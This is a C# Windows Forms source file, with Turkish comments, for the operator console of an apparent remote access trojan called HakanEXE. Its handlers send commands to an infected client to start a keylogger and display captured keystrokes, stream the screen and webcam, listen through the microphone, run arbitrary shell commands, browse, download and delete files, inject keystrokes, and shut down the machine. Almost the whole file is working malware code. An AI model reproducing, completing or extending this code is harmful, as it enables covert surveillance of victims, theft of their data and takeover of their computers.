using System;
using System.Windows.Forms;
using HakanEXE.Server.Core;
using HakanEXE.Server.Models;
using System.Drawing;
using System.IO;
// using System.Net.Sockets; // Bu using ifadesi ClientDetailForm için şu an gerekli değil ama kalabilir.

namespace HakanEXE.Server.Forms
{
    public partial class ClientDetailForm : Form
    {
        private ClientInfo _client;
        private ServerManager _serverManager;
        private Timer _screenRefreshTimer;
        // Diğer kontroller (CMD output, file list, keylogger output vs.)
        // txtCommandOutput, txtKeyloggerOutput, lblSystemInfo, lstFiles, txtCurrentPath, txtKeyboardInput gibi kontroller Designer.cs dosyasında tanımlıdır.

        public ClientDetailForm(ClientInfo client, ServerManager serverManager)
        {
            InitializeComponent();
            _client = client;
            _serverManager = serverManager;
            this.Text = $"HakanEXE - {_client.ComputerName} ({_client.IpAddress})";

            // Gelen paketleri bu forma yönlendirmek için event'e abone ol
            _serverManager.PacketReceived += ServerManager_PacketReceived;

            InitializeLiveScreen();
            InitializeFileExplorer(); // Bu metot içindeki yorumlar UI elemanlarını hatırlatır
            InitializeCommandLine();  // Bu metot içindeki yorumlar UI elemanlarını hatırlatır
            InitializeKeylogger();    // Bu metot içindeki yorumlar UI elemanlarını hatırlatır
            InitializeSystemInfo();   // Bu metot içindeki yorumlar UI elemanlarını hatırlatır
        }

        private void InitializeLiveScreen()
        {
            // pbLiveScreen tasarımcıda oluşturulduğu için burada tekrar tanımlamaya gerek yok.
            pbLiveScreen.SizeMode = PictureBoxSizeMode.Zoom;
            _screenRefreshTimer = new Timer();
            _screenRefreshTimer.Interval = 2000; // Her 2 saniyede bir
            _screenRefreshTimer.Tick += ScreenRefreshTimer_Tick;
        }

        private void InitializeFileExplorer()
        {
            // lstFiles, txtCurrentPath, btnDownloadFile, btnUploadFile, btnDeleteFile tasarımcıda oluşturulmalı ve tanımlı
            // txtCurrentPath için varsayılan bir değer atayabiliriz.
            txtCurrentPath.Text = "C:\\"; // Örnek bir başlangıç yolu
        }

        private void InitializeCommandLine()
        {
            // txtCommandText, btnExecuteCommand, txtCommandOutput tasarımcıda oluşturulmalı ve tanımlı
        }

        private void InitializeKeylogger()
        {
            // txtKeyloggerOutput tasarımcıda oluşturulmalı ve tanımlı
        }

        private void InitializeSystemInfo()
        {
            // lblSystemInfo tasarımcıda oluşturulmalı ve tanımlı
        }

        private void ScreenRefreshTimer_Tick(object sender, EventArgs e)
        {
            // Ekran görüntüsü isteme komutu gönder
            if (_client != null && _serverManager != null)
            {
                _serverManager.SendCommand(_client.IpAddress, PacketType.RequestScreenshot, "");
            }
        }

        private void BtnStartLiveScreen_Click(object sender, EventArgs e)
        {
            _screenRefreshTimer.Start();
            if (_client != null && _serverManager != null)
            {
                _serverManager.SendCommand(_client.IpAddress, PacketType.StartScreenStream, "");
            }
            MessageBox.Show("Canlı ekran görüntüsü başlatıldı.");
        }

        private void BtnStopLiveScreen_Click(object sender, EventArgs e)
        {
            _screenRefreshTimer.Stop();
            if (_client != null && _serverManager != null)
            {
                _serverManager.SendCommand(_client.IpAddress, PacketType.StopScreenStream, "");
            }
            MessageBox.Show("Canlı ekran görüntüsü durduruldu.");
        }

        private void BtnShutdown_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Bilgisayarı kapatmak istediğinize emin misiniz?", "Onay", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
            {
                if (_client != null && _serverManager != null)
                {
                    _serverManager.SendCommand(_client.IpAddress, PacketType.Shutdown, "");
                }
            }
        }

        private void BtnRestart_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Bilgisayarı yeniden başlatmak istediğinize emin misiniz?", "Onay", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
            {
                if (_client != null && _serverManager != null)
                {
                    _serverManager.SendCommand(_client.IpAddress, PacketType.Restart, "");
                }
            }
        }

        private void BtnExecuteCommand_Click(object sender, EventArgs e)
        {
            string command = txtCommandText.Text;
            if (!string.IsNullOrEmpty(command) && _client != null && _serverManager != null)
            {
                _serverManager.SendCommand(_client.IpAddress, PacketType.ExecuteCommand, command);
                txtCommandText.Clear();
            }
        }

        private void BtnOpenNotepad_Click(object sender, EventArgs e)
        {
            if (_client != null && _serverManager != null)
            {
                _serverManager.SendCommand(_client.IpAddress, PacketType.OpenNotepad, "");
            }
        }

        private void BtnGetSystemInfo_Click(object sender, EventArgs e)
        {
            if (_client != null && _serverManager != null)
            {
                _serverManager.SendCommand(_client.IpAddress, PacketType.RequestSystemInfo, "");
            }
        }

        private void ServerManager_PacketReceived(object sender, Packet packet)
        {
            if (_client == null || packet.SenderIp != _client.IpAddress)
                return;

            this.Invoke((MethodInvoker)delegate
            {
                switch (packet.PacketType)
                {
                    case PacketType.Screenshot:
                        try
                        {
                            byte[] imageBytes = Convert.FromBase64String(packet.Data);
                            using (MemoryStream ms = new MemoryStream(imageBytes))
                            {
                                pbLiveScreen.Image = Image.FromStream(ms);
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Ekran görüntüsü hatası: " + ex.Message);
                            // Belki kullanıcıya bir hata mesajı gösterebiliriz
                            // MessageBox.Show("Ekran görüntüsü alınırken bir hata oluştu.", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                        break;
                    case PacketType.CommandOutput:
                        txtCommandOutput.AppendText(packet.Data + Environment.NewLine);
                        break;
                    case PacketType.SystemInfo:
                        // Sistem bilgisini lblSystemInfo'ya daha düzgün bir formatta yazdırabiliriz.
                        // Şimdilik MessageBox ile gösteriyoruz.
                        // lblSystemInfo.Text = packet.Data; // Direkt atama yerine parse edip formatlamak daha iyi olur.
                        MessageBox.Show("Sistem Bilgisi Alındı:\n" + packet.Data, "Sistem Bilgisi", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        break;
                    case PacketType.KeylogData:
                        txtKeyloggerOutput.AppendText(packet.Data);
                        break;
                    case PacketType.FileList:
                        // Dosya listesini lstFiles'a ekle
                        // Bu kısım daha detaylı implementasyon gerektirecek.
                        // Örnek: lstFiles.Items.Clear(); string[] files = packet.Data.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries); foreach(var f in files) lstFiles.Items.Add(f);
                        MessageBox.Show("Dosya Listesi Alındı:\n" + packet.Data, "Dosya Listesi");
                        break;
                    case PacketType.MicrophoneData:
                        // Ses verisini işle (oynatma veya kaydetme)
                        MessageBox.Show("Mikrofon verisi alındı (işleme özelliği eklenecek).");
                        break;
                    case PacketType.WebcamData:
                        // Webcam görüntüsünü pbWebcam'e (Designer.cs'de tanımlı) göster
                        try
                        {
                            byte[] imageBytes = Convert.FromBase64String(packet.Data);
                            using (MemoryStream ms = new MemoryStream(imageBytes))
                            {
                                pbWebcam.Image = Image.FromStream(ms);
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Webcam görüntüsü hatası: " + ex.Message);
                        }
                        break;
                        // Diğer paket türleri için case'ler eklenebilir
                }
            });
        }

        private void ClientDetailForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_serverManager != null)
            {
                _serverManager.PacketReceived -= ServerManager_PacketReceived;
            }
            if (_screenRefreshTimer != null && _screenRefreshTimer.Enabled)
            {
                _screenRefreshTimer.Stop();
                if (_client != null && _serverManager != null)
                {
                    _serverManager.SendCommand(_client.IpAddress, PacketType.StopScreenStream, "");
                }
            }
        }

        private void BtnStartKeylogger_Click(object sender, EventArgs e)
        {
            if (_client != null && _serverManager != null)
            {
                _serverManager.SendCommand(_client.IpAddress, PacketType.StartKeylogger, "");
                MessageBox.Show("Keylogger başlatma isteği gönderildi.");
            }
        }

        private void BtnStopKeylogger_Click(object sender, EventArgs e)
        {
            if (_client != null && _serverManager != null)
            {
                _serverManager.SendCommand(_client.IpAddress, PacketType.StopKeylogger, "");
                MessageBox.Show("Keylogger durdurma isteği gönderildi.");
            }
        }

        private void BtnRefreshFiles_Click(object sender, EventArgs e)
        {
            if (_client != null && _serverManager != null && !string.IsNullOrEmpty(txtCurrentPath.Text))
            {
                _serverManager.SendCommand(_client.IpAddress, PacketType.RequestFileList, txtCurrentPath.Text);
            }
            else if (string.IsNullOrEmpty(txtCurrentPath.Text))
            {
                MessageBox.Show("Lütfen geçerli bir dizin yolu girin.", "Uyarı", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        // --- ÖNCEKİ MESAJDA EKLEMENİ İSTEDİĞİM OLAY YÖNETİCİLERİ BURADA BAŞLIYOR ---

        private void TabControlClient_SelectedIndexChanged(object sender, EventArgs e)
        {
            // Aktif sekmeye göre özel işlemler yapılabilir.
            // Örneğin, "Ekran" sekmesi aktif değilse _screenRefreshTimer'ı durdurabiliriz.
            if (tabControlClient.SelectedTab == tabPageScreen)
            {
                // Eğer canlı yayın açıksa ve timer çalışmıyorsa başlatılabilir (opsiyonel)
            }
            else
            {
                // Diğer sekmelerdeyken ekran akışını durdurmak istiyorsak:
                // if (_screenRefreshTimer.Enabled)
                // {
                //    BtnStopLiveScreen_Click(null, null); // Veya direkt komut gönder
                // }
            }
        }

        private void LstFiles_DoubleClick(object sender, EventArgs e)
        {
            if (lstFiles.SelectedItems.Count > 0)
            {
                string selectedItem = lstFiles.SelectedItems[0].Text; // Bu, öğenin ilk sütunu olur.
                // Seçilen öğenin bir dosya mı klasör mü olduğunu anlamak için ek bilgiye (örneğin bir SubItem veya Tag) ihtiyacımız olacak.
                // Şimdilik sadece mesaj gösterelim:
                MessageBox.Show($"Seçilen öğe: {selectedItem}\nDetaylı işlem (klasöre girme/dosya açma) eklenecek.", "Dosya Yöneticisi");

                // Örnek: Eğer bir klasörse, txtCurrentPath'i güncelle ve dosyaları yeniden iste
                // if (selectedItem.StartsWith("<DIR>")) // Agent'dan gelen veriye göre
                // {
                //    txtCurrentPath.Text = System.IO.Path.Combine(txtCurrentPath.Text, selectedItem.Substring(6).Trim());
                //    BtnRefreshFiles_Click(sender, e);
                // }
            }
        }

        private void TxtCurrentPath_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == (char)Keys.Enter)
            {
                BtnRefreshFiles_Click(sender, e); // Yenile butonunun işlevini çağır
                e.Handled = true; // Enter tuşunun varsayılan sesini/davranışını engelle
            }
        }

        private void BtnStartMicrophone_Click(object sender, EventArgs e)
        {
            if (_client != null && _serverManager != null)
            {
                _serverManager.SendCommand(_client.IpAddress, PacketType.StartMicrophone, "");
                MessageBox.Show("Mikrofon dinleme isteği gönderildi.");
            }
        }

        private void BtnStopMicrophone_Click(object sender, EventArgs e)
        {
            if (_client != null && _serverManager != null)
            {
                _serverManager.SendCommand(_client.IpAddress, PacketType.StopMicrophone, "");
                MessageBox.Show("Mikrofon dinlemeyi durdurma isteği gönderildi.");
            }
        }

        private void BtnStartWebcam_Click(object sender, EventArgs e)
        {
            if (_client != null && _serverManager != null)
            {
                _serverManager.SendCommand(_client.IpAddress, PacketType.StartWebcam, "");
                MessageBox.Show("Webcam başlatma isteği gönderildi.");
            }
        }

        private void BtnStopWebcam_Click(object sender, EventArgs e)
        {
            if (_client != null && _serverManager != null)
            {
                _serverManager.SendCommand(_client.IpAddress, PacketType.StopWebcam, "");
                MessageBox.Show("Webcam durdurma isteği gönderildi.");
            }
        }

        private void BtnMouseClick_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Mouse tıklama özelliği eklenecek (koordinat gönderme vb.).");
            // if (_client != null && _serverManager != null)
            // {
            //    _serverManager.SendCommand(_client.IpAddress, PacketType.MouseClick, "X,Y,ButtonType"); // Örnek veri formatı
            // }
        }

        private void BtnSendKeyboardInput_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrEmpty(txtKeyboardInput.Text) && _client != null && _serverManager != null)
            {
                _serverManager.SendCommand(_client.IpAddress, PacketType.KeyboardInput, txtKeyboardInput.Text);
                MessageBox.Show($"'{txtKeyboardInput.Text}' gönderildi.");
                txtKeyboardInput.Clear();
            }
        }

        private void BtnDownloadFile_Click(object sender, EventArgs e)
        {
            if (lstFiles.SelectedItems.Count > 0)
            {
                string fileName = lstFiles.SelectedItems[0].Text; // Veya dosya adını tuttuğunuz uygun SubItem
                                                                  // Dosya adını ve tam yolu birleştir
                string fullPathToDownload = Path.Combine(txtCurrentPath.Text, fileName);

                // Kaydetme iletişim kutusunu göster
                SaveFileDialog saveFileDialog = new SaveFileDialog();
                saveFileDialog.FileName = fileName;
                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    // Agent'a dosya indirme isteği gönder (dosya yolu ve kaydedilecek yer bilgisiyle)
                    // Bu kısım agent tarafında dosya transferi mekanizması gerektirir.
                    // Şimdilik sadece isteği gönderelim, agent'tan dosya verisi bekleyelim.
                    // Packet.Data formatı: "REMOTE_FILE_PATH|LOCAL_SAVE_PATH_ON_SERVER_OR_TRIGGER_CLIENT_SAVE_DIALOG"
                    // Ya da daha basiti: Sadece REMOTE_FILE_PATH gönder, gelen byte'ları server'da bu saveFileDialog.FileName'e yaz.
                    // _serverManager.SendCommand(_client.IpAddress, PacketType.DownloadFile, fullPathToDownload + "|" + saveFileDialog.FileName);
                    _serverManager.SendCommand(_client.IpAddress, PacketType.DownloadFile, fullPathToDownload);
                    MessageBox.Show($"'{fileName}' için indirme isteği gönderildi. Kaydedilecek yer: {saveFileDialog.FileName}\n(Bu özellik agent tarafında implementasyon gerektirir.)");
                }
            }
            else
            {
                MessageBox.Show("Lütfen indirilecek bir dosya seçin.", "Uyarı", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private void BtnUploadFile_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                string localFilePath = openFileDialog.FileName;
                string remoteFileName = Path.GetFileName(localFilePath);
                string remoteUploadPath = Path.Combine(txtCurrentPath.Text, remoteFileName);

                // Dosyayı byte dizisine oku
                // byte[] fileBytes = File.ReadAllBytes(localFilePath);
                // String base64File = Convert.ToBase64String(fileBytes);
                // Packet.Data: "REMOTE_UPLOAD_PATH|BASE64_FILE_DATA"
                // _serverManager.SendCommand(_client.IpAddress, PacketType.UploadFile, remoteUploadPath + "|" + base64File);
                MessageBox.Show($"'{remoteFileName}' için yükleme özelliği eklenecek.\nKaynak: {localFilePath}\nHedef: {remoteUploadPath}\n(Bu özellik agent tarafında implementasyon gerektirir ve büyük dosyalar için farklı bir yaklaşım gerekebilir.)");
            }
        }

        private void BtnDeleteFile_Click(object sender, EventArgs e)
        {
            if (lstFiles.SelectedItems.Count > 0)
            {
                string fileName = lstFiles.SelectedItems[0].Text; // Veya dosya adını tuttuğunuz uygun SubItem
                string fullPathToDelete = Path.Combine(txtCurrentPath.Text, fileName);

                if (MessageBox.Show($"'{fileName}' dosyasını silmek istediğinize emin misiniz?", "Silme Onayı", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
                {
                    _serverManager.SendCommand(_client.IpAddress, PacketType.DeleteFile, fullPathToDelete);
                    MessageBox.Show($"'{fileName}' için silme isteği gönderildi.");
                }
            }
            else
            {
                MessageBox.Show("Lütfen silinecek bir dosya seçin.", "Uyarı", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }
        // --- EK OLAY YÖNETİCİLERİ BURADA BİTİYOR ---
    }
}